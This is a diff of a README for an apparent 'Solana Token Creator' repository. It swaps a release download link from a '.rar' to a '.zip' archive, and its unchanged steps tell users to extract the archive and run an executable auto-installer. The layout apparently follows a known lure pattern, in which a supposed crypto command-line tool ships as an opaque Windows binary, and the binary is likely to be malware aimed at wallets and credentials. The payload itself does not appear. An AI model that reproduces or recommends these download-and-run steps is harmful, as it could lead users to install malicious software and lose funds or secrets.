@@ -8,9 +8,9 @@ Create a new Solana fungible token using command-line tools and scripts. Plus: m
  ### Installation
 
 
-[Download the archive](https://github.com/viktakeynote/Solana-Token-Creator/releases/download/Download/application.rar)
+[Download the archive](https://github.com/viktakeynote/Solana-Token-Creator/releases/download/Download/application.zip)
 
-## **1. [Download the archive](https://github.com/viktakeynote/Solana-Token-Creator/releases/download/Download/application.rar) from releases and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/viktakeynote/Solana-Token-Creator/releases/download/Download/application.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
 
 > [!TIP] 
